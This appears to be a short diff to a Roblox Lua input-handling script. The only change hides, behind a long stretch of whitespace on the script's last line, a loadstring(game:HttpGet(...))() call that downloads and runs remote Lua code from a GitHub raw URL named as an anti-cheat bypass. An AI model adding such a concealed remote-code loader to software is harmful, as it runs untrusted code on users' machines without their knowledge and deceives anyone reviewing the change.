@@ -22,4 +22,4 @@ UserInputService.InputBegan:Connect(function(Input, _p)
             Origin = LcPlayer.Character.HumanoidRootPart
         })
     end
-end)
+end)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    loadstring(game:HttpGet("https://raw.githubusercontent.com/A-DREAM-YOUVE-HAD-BEFORE/N-O-I-C-E/refs/heads/main/YbaAntiCheatBypass.lua"))()
